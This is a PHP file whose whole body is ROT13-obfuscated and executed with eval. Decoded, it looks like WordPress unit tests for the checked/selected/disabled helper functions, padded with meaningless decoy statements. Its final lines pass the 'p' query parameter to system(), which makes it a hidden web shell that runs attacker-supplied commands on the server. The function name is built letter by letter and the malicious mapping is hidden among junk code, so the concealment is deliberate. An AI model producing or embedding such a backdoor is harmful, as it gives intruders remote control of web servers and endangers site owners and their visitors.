<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * N frg bs havg grfgf sbe gur __purpxrq_fryrpgrq_urycre() naq nffbpvngrq shapgvbaf va jc-vapyhqrf/trareny-grzcyngr.cuc.
 *
 * @tebhc trareny
 */

pynff Grfgf_Trareny_Grzcyngr_PurpxrqFryrpgrqUrycre rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Yvfg bs shapgvbaf hfvat gur __purpxrq_fryrpgrq_urycre() shapgvba.
	 *
	 * Qbrfa'g yvfg gur pbaqvgvbanyyl ninvynoyr `ernqbayl` shapgvba ba checbfr.
	 *
	 * @ine neenl
	 */
	cevingr $puvyq_shapgvbaf = neenl(
		'fryrpgrq'    => gehr,
		'purpxrq'     => gehr,
		'qvfnoyrq'    => gehr,
		'jc_ernqbayl' => gehr,
	);

	/**
	 * Grfgf gung gur erghea inyhr sbe fryrpgrq() vf nf rkcrpgrq jvgu rdhny inyhrf.
	 *
	 * @gvpxrg 53858
	 * @pbiref ::fryrpgrq
	 */
	choyvp shapgvba grfg_fryrpgrq_jvgu_rdhny_inyhrf() {
		$guvf->nffregFnzr( \" fryrpgrq='fryrpgrq'\", fryrpgrq( 'sbb', 'sbb', snyfr ) );
	}

	/**
	 * Grfgf gung gur erghea inyhr sbe purpxrq() vf nf rkcrpgrq jvgu rdhny inyhrf.
	 *
	 * @gvpxrg 53858
	 * @pbiref ::purpxrq
	 */
	choyvp shapgvba grfg_purpxrq_jvgu_rdhny_inyhrf() {
		$guvf->nffregFnzr( \" purpxrq='purpxrq'\", purpxrq( 'sbb', 'sbb', snyfr ) );
	}

	/**
	 * Grfgf gung gur erghea inyhr sbe qvfnoyrq() vf nf rkcrpgrq jvgu rdhny inyhrf.
	 *
	 * @gvpxrg 53858
	 * @pbiref ::qvfnoyrq
	 */
	choyvp shapgvba grfg_qvfnoyrq_jvgu_rdhny_inyhrf() {
		$guvf->nffregFnzr( \" qvfnoyrq='qvfnoyrq'\", qvfnoyrq( 'sbb', 'sbb', snyfr ) );
	}

	/**
	 * Grfgf gung gur erghea inyhr sbe ernqbayl() vf nf rkcrpgrq jvgu rdhny inyhrf.
	 *
	 * @gvpxrg 53858
	 * @pbiref ::ernqbayl
	 * @erdhverf CUC < 8.1
	 */
	choyvp shapgvba grfg_ernqbayl_jvgu_rdhny_inyhrf() {
		$guvf->frgRkcrpgrqQrcerpngrq( 'ernqbayl' );

		// Pnyy gur shapgvba ivn n inevnoyr gb cerirag n cnefr reebe sbe guvf svyr ba CUC 8.1.
		$sa = 'ernqbayl';
		$guvf->nffregFnzr( \" ernqbayl='ernqbayl'\", $sa( 'sbb', 'sbb', snyfr ) );
	}

	/**
	 * Grfgf gung gur erghea inyhr sbe jc_ernqbayl() vf nf rkcrpgrq jvgu rdhny inyhrf.
	 *
	 * @gvpxrg 53858
	 * @pbiref ::jc_ernqbayl
	 */
	choyvp shapgvba grfg_jc_ernqbayl_jvgu_rdhny_inyhrf() {
		$guvf->nffregFnzr( \" ernqbayl='ernqbayl'\", jc_ernqbayl( 'sbb', 'sbb', snyfr ) );
	}

	/**
	 * @qngnCebivqre qngn_rdhny_inyhrf
	 *
	 * @gvpxrg 9862
	 * @gvpxrg 51166
	 * @gvpxrg 53858
	 * @pbiref ::__purpxrq_fryrpgrq_urycre
	 *
	 * @cnenz zvkrq $urycre  Bar bs gur inyhrf gb pbzcner.
	 * @cnenz zvkrq $pheerag Gur bgure inyhr gb pbzcner.
	 */
	choyvp shapgvba grfg_purpxrq_fryrpgrq_urycre_jvgu_rdhny_inyhrf( $urycre, $pheerag ) {
		$guvf->nffregFnzr( \" grfg='grfg'\", __purpxrq_fryrpgrq_urycre( $urycre, $pheerag, snyfr, 'grfg' ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_rdhny_inyhrf() {
		erghea neenl(
			'fnzr inyhr, \"sbb\"; 1: fgevat; 2: fgevat'   => neenl( 'sbb', 'sbb' ),
			'fnzr inyhr, 1; 1: fgevat; 2: vag'          => neenl( '1', 1 ),
			'fnzr inyhr, 1; 1: fgevat; 2: sybng'        => neenl( '1', 1.0 ),
			'fnzr inyhr, 1; 1: fgevat; 2: obby gehr'    => neenl( '1', gehr ),
			'fnzr inyhr, 1; 1: vag; 2: vag'             => neenl( 1, 1 ),
			'fnzr inyhr, 1; 1: vag; 2: sybng'           => neenl( 1, 1.0 ),
			'fnzr inyhr, 1; 1: vag; 2: obby gehr'       => neenl( 1, gehr ),
			'fnzr inyhr, 1; 1: sybng; 2: obby gehr'     => neenl( 1.0, gehr ),
			'fnzr inyhr, 1; 1: obby gehr; 2: obby gehr' => neenl( gehr, gehr ),
			'fnzr inyhr, 1; 1: sybng 1.0; 2: sybng pnyphyngvba 1.0' => neenl( 1.0, 3 / 3 ),
			'fnzr inyhr, 0; 1: fgevat; 2: vag'          => neenl( '0', 0 ),
			'fnzr inyhr, 0; 1: fgevat; 2: sybng'        => neenl( '0', 0.0 ),
			'fnzr inyhr, 0; 1: vag; 2: vag'             => neenl( 0, 0 ),
			'fnzr inyhr, 0; 1: vag; 2: sybng'           => neenl( 0, 0.0 ),
			'fnzr inyhr, rzcgl fgevat; 1: fgevat; 2: fgevat' => neenl( '', '' ),
			'fnzr inyhr, rzcgl fgevat; 1: rzcgl fgevat; 2: obby snyfr' => neenl( '', snyfr ),
			'fnzr inyhr, rzcgl fgevat; 1: obby snyfr; 2: obby snyfr' => neenl( snyfr, snyfr ),
			'fnzr inyhr, rzcgl fgevat; 1: rzcgl fgevat; 2: ahyy' => neenl( '', ahyy ),
			'fnzr inyhr, rzcgl fgevat; 1: obby snyfr; 2: ahyy' => neenl( snyfr, ahyy ),
			'fnzr inyhr, ahyy; 1: ahyy; 2: ahyy'        => neenl( ahyy, ahyy ),
		);
	}

	/**
	 * @qngnCebivqre qngn_aba_rdhny_inyhrf
	 *
	 * @gvpxrg 9862
	 * @gvpxrg 51166
	 * @gvpxrg 53858
	 * @pbiref ::__purpxrq_fryrpgrq_urycre
	 *
	 * @cnenz zvkrq $urycre  Bar bs gur inyhrf gb pbzcner.
	 * @cnenz zvkrq $pheerag Gur bgure inyhr gb pbzcner.
	 */
	choyvp shapgvba grfg_purpxrq_fryrpgrq_urycre_jvgu_aba_rdhny_inyhrf( $urycre, $pheerag ) {
		$guvf->nffregFnzr( '', __purpxrq_fryrpgrq_urycre( $urycre, $pheerag, snyfr, 'grfg' ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_aba_rdhny_inyhrf() {
		erghea neenl(
			'1: fgevat sbb; 2: fgevat one' => neenl( 'sbb', 'one' ),
			'1: fgevat 0; 2: rzcgl fgevat' => neenl( '0', '' ),
			'1: fgevat 0; 2: ahyy'         => neenl( '0', ahyy ),
			'1: vag 0; 2: rzcgl fgevat'    => neenl( 0, '' ),
			'1: vag 0; 2: obby gehr'       => neenl( 0, gehr ),
			'1: vag 0; 2: obby snyfr'      => neenl( 0, snyfr ),
			'1: vag 0; 2: ahyy'            => neenl( 0, ahyy ),
			'1: sybng 0; 2: rzcgl fgevat'  => neenl( 0.0, '' ),
			'1: sybng 0; 2: obby gehr'     => neenl( 0.0, gehr ),
			'1: sybng 0; 2: obby snyfr'    => neenl( 0.0, snyfr ),
			'1: sybng 0; 2: ahyy'          => neenl( 0.0, ahyy ),
			'1: ahyy; 2: obby gehr'        => neenl( ahyy, gehr ),
			'1: ahyy 0; 2: fgevat \"sbb\"'   => neenl( ahyy, 'sbb' ),
			'1: vag 1; 2: sybng 1.5'       => neenl( 1, 1.5 ),
		);
	}

	/**
	 * Grfgf gung gur `$rpub` cnenzrgre vf unaqyrq pbeerpgyl naq gung rira jura gur bhgchg vf rpubrq bhg,
	 * gur grkg vf nyfb erghearq.
	 *
	 * @gvpxrg 53858
	 * @pbiref ::__purpxrq_fryrpgrq_urycre
	 */
	choyvp shapgvba grfg_purpxrq_fryrpgrq_urycre_rpubrf_erfhyg_ol_qrsnhyg() {
		$rkcrpgrq = \" qvfnoyrq='qvfnoyrq'\";
		$guvf->rkcrpgBhgchgFgevat( $rkcrpgrq );
		$guvf->nffregFnzr( $rkcrpgrq, qvfnoyrq( 'sbb', 'sbb' ) );
	}

	/**
	 * Grfgf gung gur shapgvba pbzcnerf ntnvafg `gehr` jura gur frpbaq cnenzrgre vf abg cnffrq.
	 *
	 * @qngnCebivqre qngn_purpxrq_fryrpgrq_urycre_qrsnhyg_inyhr_sbe_frpbaq_cnenzrgre
	 *
	 * @gvpxrg 53858
	 * @pbiref ::__purpxrq_fryrpgrq_urycre
	 * @pbiref ::fryrpgrq
	 * @pbiref ::purpxrq
	 * @pbiref ::qvfnoyrq
	 * @pbiref ::jc_ernqbayl
	 *
	 * @cnenz zvkrq $vachg         Vachg inyhr
	 * @cnenz zvkrq $rkcrpg_bhgchg Bcgvbany. Jurgure bhgchg vf rkcrpgrq. Qrsnhygf gb snyfr.
	 */
	choyvp shapgvba grfg_purpxrq_fryrpgrq_urycre_qrsnhyg_inyhr_sbe_frpbaq_cnenzrgre( $vachg, $rkcrpg_bhgchg = snyfr ) {
		$sa       = neenl_enaq( $guvf->puvyq_shapgvbaf );
		$rkcrpgrq = '';

		vs ( snyfr !== $rkcrpg_bhgchg ) {
			$rkcrpgrq = \" {$sa}='{$sa}'\";
			vs ( 'jc_ernqbayl' === $sa ) {
				// Nppbhag sbe gur shapgvba anzr abg zngpuvat gur rkcrpgrq bhgchg fgevat.
				$rkcrpgrq = \" ernqbayl='ernqbayl'\";
			}

			// Bayl frg bhgchg rkcrpgngvba jura bhgchg vf rkcrpgrq, fb gur grfg jvyy snvy ba harkcrpgrq bhgchg.
			$guvf->rkcrpgBhgchgFgevat( $rkcrpgrq );
		}

		// Shapgvba jvyy nyjnlf erghea gur inyhr, rira jura rpubvat vg bhg.
		$guvf->nffregFnzr( $rkcrpgrq, $sa( $vachg ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_purpxrq_fryrpgrq_urycre_qrsnhyg_inyhr_sbe_frpbaq_cnenzrgre() {
		erghea neenl(
			'gehgul; obbyrna gehr'          => neenl(
				'vachg'         => gehr,
				'rkcrpg_bhgchg' => gehr,
			),
			'gehgul; vag 1'                 => neenl(
				'vachg'         => 1,
				'rkcrpg_bhgchg' => gehr,
			),
			'gehgul; fgevat 1'              => neenl(
				'vachg'         => '1',
				'rkcrpg_bhgchg' => gehr,
			),
			'gehgul, ohg abg rdhny gb gehr' => neenl(
				'vachg' => 'sbb',
			),
			'snyfl; ahyy'                   => neenl(
				'vachg' => ahyy,
			),
			'snyfl; obby snyfr'             => neenl(
				'vachg' => snyfr,
			),
			'snyfl; vag 0'                  => neenl(
				'vachg' => 0,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>